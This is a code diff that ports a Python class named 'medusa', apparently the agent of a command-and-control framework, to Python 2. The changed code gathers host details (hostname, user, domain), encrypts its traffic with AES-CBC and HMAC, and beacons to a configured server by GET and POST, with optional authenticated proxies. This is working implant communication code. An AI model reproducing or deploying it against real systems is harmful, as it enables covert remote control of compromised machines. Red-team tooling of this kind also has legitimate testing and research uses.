@@ -1,7 +1,6 @@
 import os, random, sys, json, socket, base64, time, platform
-import urllib.request
+import urllib2
 from datetime import datetime
-from pprint import pprint
 
 class medusa:
 
@@ -16,7 +15,15 @@ class medusa:
         return socket.gethostname()
 
     def getUsername(self):
-        return os.getlogin()
+        try: 
+            return os.getlogin() 
+        except: 
+            pass
+
+        if "USER" in os.environ.keys():
+            return os.environ["USER"]
+        elif "LOGNAME" in os.environ.keys():
+            return os.environ["LOGNAME"]
 
     def getDomain(self):
         return socket.getfqdn()
@@ -49,12 +56,14 @@ class medusa:
     def encrypt(self, data):
         from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
         from cryptography.hazmat.primitives import hashes, hmac, padding
+        from cryptography.hazmat.backends import default_backend
 
-        if not self.agent_config["enc_key"]["value"] == "None" and len(data)>0:
+        if not self.agent_config["enc_key"]["value"] == "none" and len(data)>0:
             key = base64.b64decode(self.agent_config["enc_key"]["enc_key"])
             iv = os.urandom(16)
 
-            cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
+            backend = default_backend()
+            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend)
             encryptor = cipher.encryptor()
 
             padder = padding.PKCS7(128).padder()
@@ -63,7 +72,7 @@ class medusa:
 
             ct = encryptor.update(padded_data) + encryptor.finalize()
 
-            h = hmac.HMAC(key, hashes.SHA256())
+            h = hmac.HMAC(key, hashes.SHA256(), backend)
             h.update(iv + ct)
             hmac = h.finalize()
 
@@ -75,21 +84,24 @@ class medusa:
     def decrypt(self, data):
         from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
         from cryptography.hazmat.primitives import hashes, hmac, padding
+        from cryptography.hazmat.backends import default_backend
 
-        if not self.agent_config["enc_key"]["value"] == "None":
+        if not self.agent_config["enc_key"]["value"] == "none":
             if len(data)>0:
+                backend = default_backend()
+
                 key = base64.b64decode(self.agent_config["enc_key"]["dec_key"])
                 uuid = data[:36] # uuid prefix
                 iv = data[36:52] # trim uuid
                 ct = data[52:-32] # ciphertext been uuid+iv and hmac
                 received_hmac = data[-32:] #hmac
 
-                h = hmac.HMAC(key, hashes.SHA256())
+                h = hmac.HMAC(key, hashes.SHA256(), backend)
                 h.update(iv + ct)
                 hmac = h.finalize()
 
                 if base64.b64encode(hmac) == base64.b64encode(received_hmac):
-                    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
+                    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend)
                     decryptor = cipher.decryptor()
                     pt = decryptor.update(ct) + decryptor.finalize()
                     unpadder = padding.PKCS7(128).unpadder()
@@ -100,7 +112,6 @@ class medusa:
             else: return ""
         else:
             return data.decode()
-
 
     # Comms
     def postResponses(self):
@@ -184,29 +195,28 @@ class medusa:
         hdrs = {}
         for header in self.agent_config["Headers"]:
             hdrs[header["name"]] = header["value"]
-        req = urllib.request.Request(self.agent_config["Server"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetURI"] + "=" + data.decode(), hdrs)
+        req = urllib2.Request(self.agent_config["Server"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetURI"] + "=" + data.decode(), None, hdrs)
 
         if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
             tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
-            handler = urllib.request.HTTPSHandler if tls else urllib.request.HTTPHandler
+            handler = urllib2.HTTPSHandler if tls else urllib2.HTTPHandler
             if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
-                proxy = urllib.request.ProxyHandler({
+                proxy = urllib2.ProxyHandler({
                     "{}".format(tls): '{}://{}:{}@{}:{}'.format(tls, self.agent_config["ProxyUser"], self.agent_config["ProxyPass"], \
                         self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                 })
-                auth = urllib.request.HTTPBasicAuthHandler()
-                opener = urllib.request.build_opener(proxy, auth, handler)
+                auth = urllib2.HTTPBasicAuthHandler()
+                opener = urllib2.build_opener(proxy, auth, handler)
             else:
-                proxy = urllib.request.ProxyHandler({
+                proxy = urllib2.ProxyHandler({
                     "{}".format(tls): '{}://{}:{}'.format(tls, self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                 })
-                opener = urllib.request.build_opener(proxy, handler)
+                opener = urllib2.build_opener(proxy, handler)
                 
-            urllib.request.install_opener(opener)
+            urllib2.install_opener(opener)
 
         try:
-            with urllib.request.urlopen(req) as response:
-                return base64.b64decode(response.read()).decode()
+            return base64.b64decode(urllib2.urlopen(req).read()).decode()
         except:
             return ""
 
@@ -214,29 +224,25 @@ class medusa:
         hdrs = {}
         for header in self.agent_config["Headers"]:
             hdrs[header["name"]] = header["value"]
-        req = urllib.request.Request(self.agent_config["Server"] + self.agent_config["PostURI"], data, hdrs)
-
+        req = urllib2.Request(self.agent_config["Server"] + self.agent_config["PostURI"], data, hdrs)
         if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
             tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
-            handler = urllib.request.HTTPSHandler if tls else urllib.request.HTTPHandler
+            handler = urllib2.HTTPSHandler if tls else urllib2.HTTPHandler
             if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
-                proxy = urllib.request.ProxyHandler({
+                proxy = urllib2.ProxyHandler({
                     "{}".format(tls): '{}://{}:{}@{}:{}'.format(tls, self.agent_config["ProxyUser"], self.agent_config["ProxyPass"], \
                         self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                 })
-                auth = urllib.request.HTTPBasicAuthHandler()
-                opener = urllib.request.build_opener(proxy, auth, handler)
+                auth = urllib2.HTTPBasicAuthHandler()
+                opener = urllib2.build_opener(proxy, auth, handler)
             else:
-                proxy = urllib.request.ProxyHandler({
+                proxy = urllib2.ProxyHandler({
                     "{}".format(tls): '{}://{}:{}'.format(tls, self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                 })
-                opener = urllib.request.build_opener(proxy, handler)
-                
-            urllib.request.install_opener(opener)
-
+                opener = urllib2.build_opener(proxy, handler)
+            urllib2.install_opener(opener)
         try:
-            with urllib.request.urlopen(req) as response:
-                return base64.b64decode(response.read())
+            return base64.b64decode(urllib2.urlopen(req).read())
         except:
             return ""
 
